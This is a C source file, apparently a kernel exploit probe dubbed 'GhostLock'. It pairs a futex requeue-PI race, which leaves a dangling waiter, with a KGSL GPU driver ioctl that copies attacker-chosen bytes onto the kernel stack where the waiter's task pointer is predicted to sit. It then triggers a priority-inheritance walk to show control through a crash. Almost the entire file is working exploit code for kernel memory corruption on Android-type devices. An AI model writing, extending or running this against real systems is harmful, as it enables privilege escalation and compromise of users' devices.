/**
 * ghostlock64_list_cfu.c — GhostLock + real ibdesc-list CFU
 *
 * CORRECTED path (2026-07-25):
 *   kgsl_ioctl_rb_issueibcmds only CFU-copies ibdesc[] when
 *   *(u8*)(cmd + 0x18) bit2 is set → kgsl_drawobj_cmd_add_ibdesc_list.
 *   Prior probes used flags=0 (add_ibdesc, no CFU) — invalid for stack cover tests.
 *
 * Native ISSUEIBCMDS size 0x20, flags2@+0x18 = 0x4, crash pattern in ibdesc.
 * Kernel crash after PI / survival both informative.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define IOC(nr, sz)                                                        \
  (((uint32_t)3 << 30) | (((uint32_t)(sz)) << 16) |                        \
   (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))

struct issueib_native {
  uint32_t drawctxt_id;
  uint32_t flags;
  uint64_t ibdesc_addr;
  uint32_t numibs;
  uint32_t timestamp;
  uint32_t flags2; /* +0x18: bit2 selects list CFU path */
  uint32_t pad;
} __attribute__((packed));

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;
static int g_fd = -1;
static uint32_t g_ctx_id;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
  (void)a;

  g_fd = open("/dev/kgsl-3d0", O_RDWR);
  if (g_fd < 0) {
    printf("open failed errno=%d\n", errno);
    kgsl_done = 1;
    return 0;
  }
  struct {
    uint32_t f;
    uint32_t id;
  } ctx = {0x12, 0};
  if (ioctl(g_fd, IOC(0x13, 0x08), &ctx) < 0) {
    printf("CREATE failed errno=%d\n", errno);
    close(g_fd);
    kgsl_done = 1;
    return 0;
  }
  g_ctx_id = ctx.id;
  printf("[pre] kgsl fd=%d ctx=%u\n", g_fd, g_ctx_id);

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(1000);

  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_sec += 8;
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  printf("[waiter] GhostLock returned: ret=%ld errno=%d\n", r, errno);

  /*
   * Real list CFU: copies 0x20 bytes to add_ibdesc_list SP+8.
   * Absolute (stack top): CFU [0x308, 0x328), waiter->task @ 0x320
   *   → task sits at CFU buffer +0x18 (NOT +0x08 sizedwords).
   * Fill full 32B so offset +0x18 is controlled.
   */
  uint64_t ib[4] __attribute__((aligned(8)));
  ib[0] = 0x0ULL;                /* +0x00 */
  ib[1] = 0x1111111111111111ULL; /* +0x08 */
  ib[2] = 0x2222222222222222ULL; /* +0x10 */
  ib[3] = 0x4141414141414141ULL; /* +0x18 → predicted waiter->task */

  struct issueib_native cmd;
  memset(&cmd, 0, sizeof(cmd));
  cmd.drawctxt_id = g_ctx_id;
  cmd.flags = 0;
  cmd.ibdesc_addr = (uint64_t)(uintptr_t)ib;
  cmd.numibs = 1;
  cmd.timestamp = 0;
  cmd.flags2 = 0x4; /* list path CFU */

  printf("[kgsl] FIRING list-CFU ISSUEIBCMDS (flags2=0x4)\n");
  printf("[kgsl]   CFU buf +0x00=%016llx +0x08=%016llx\n",
         (unsigned long long)ib[0], (unsigned long long)ib[1]);
  printf("[kgsl]   CFU buf +0x10=%016llx +0x18=%016llx (task slot)\n",
         (unsigned long long)ib[2], (unsigned long long)ib[3]);

  errno = 0;
  r = ioctl(g_fd, IOC(0x10, 0x20), &cmd);
  printf("[kgsl] ISSUEIBCMDS: ret=%ld errno=%d %s\n", r, errno,
         r == 0 ? "OK" : strerror(errno));
  printf("[kgsl] (EINVAL after list CFU is OK if EFAULT path was proven)\n");

  /*
   * Kick PI machinery that may walk a dangling GhostLock waiter.
   * sched_setattr often exercises rt_mutex / pi adjust paths.
   */
  {
    struct {
      uint32_t size;
      uint32_t sched_policy;
      uint64_t sched_flags;
      int32_t sched_nice;
      uint32_t sched_priority;
      uint64_t sched_runtime;
      uint64_t sched_deadline;
      uint64_t sched_period;
      uint32_t sched_util_min;
      uint32_t sched_util_max;
    } attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.sched_policy = 0; /* SCHED_NORMAL */
    attr.sched_nice = 5;
    errno = 0;
    /* aarch64 __NR_sched_setattr = 274 */
    r = syscall(274, 0, &attr, 0);
    printf("[pi] sched_setattr nice=5: ret=%ld errno=%d\n", r, errno);
    attr.sched_nice = 0;
    errno = 0;
    r = syscall(274, 0, &attr, 0);
    printf("[pi] sched_setattr nice=0: ret=%ld errno=%d\n", r, errno);
  }

  /* Do not LOCK_PI f_pi_target — owner holds it for the race window. */

  ioctl(g_fd, IOC(0x14, 0x04), &g_ctx_id);
  close(g_fd);
  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  kgsl_done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!ready)
    usleep(1000);
  usleep(500000);
  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  while (!kgsl_done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock64_list_cfu — real ibdesc list CFU after GhostLock\n");
  printf("KERNEL CRASH on PI walk => waiter->task covered\n\n");

  f_wait = f_pi_target = f_pi_chain = 0;

  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(200000);
  pthread_create(&ot, 0, owner, 0);
  usleep(300000);

  printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
  for (int i = 0; i < 100; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld\n\n", r);
      break;
    }
    usleep(1000);
  }

  while (!kgsl_done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED (list CFU did not cover task, or PI unused) ===\n");
  return 0;
}
